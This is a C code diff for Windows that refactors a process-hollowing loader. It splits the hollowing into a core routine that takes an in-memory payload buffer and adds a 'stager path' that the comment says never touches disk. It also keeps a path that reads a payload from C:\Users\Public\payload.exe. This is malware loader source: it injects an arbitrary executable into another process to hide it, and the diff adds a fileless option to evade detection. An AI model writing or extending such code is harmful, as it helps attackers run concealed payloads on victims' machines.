@@ -259,14 +259,10 @@ void ApplyRelocations(
 }
 
 // ─────────────────────────────────────────────
-// Main hollowing logic — direct syscall edition
+// Core hollowing logic — takes an in-memory payload buffer
 // ─────────────────────────────────────────────
-DWORD RunHollowPipeline() {
-
-    // ── 0. Read payload ────────────────────────────────────────────────
-    DWORD payloadSize = 0;
-    LPBYTE payload = ReadPayloadFromDisk("C:\\Users\\Public\\payload.exe", &payloadSize);
-    if (!payload) return 1;
+static DWORD RunHollowCore(LPBYTE payload, DWORD payloadSize) {
+    if (!payload || payloadSize == 0) return 1;
 
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
@@ -483,6 +479,20 @@ DWORD RunHollowPipeline() {
     DWORD hollowedPid = pi.dwProcessId;
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    free(payload);
     return hollowedPid;
+}
+
+// Public: payload already in memory (stager path — never touches disk)
+DWORD RunHollowPipelineFromBuffer(LPBYTE buf, DWORD size) {
+    return RunHollowCore(buf, size);
+}
+
+// Public: reads payload from C:\Users\Public\payload.exe
+DWORD RunHollowPipeline() {
+    DWORD payloadSize = 0;
+    LPBYTE payload = ReadPayloadFromDisk("C:\\Users\\Public\\payload.exe", &payloadSize);
+    if (!payload) return 1;
+    DWORD result = RunHollowCore(payload, payloadSize);
+    free(payload);
+    return result;
 }
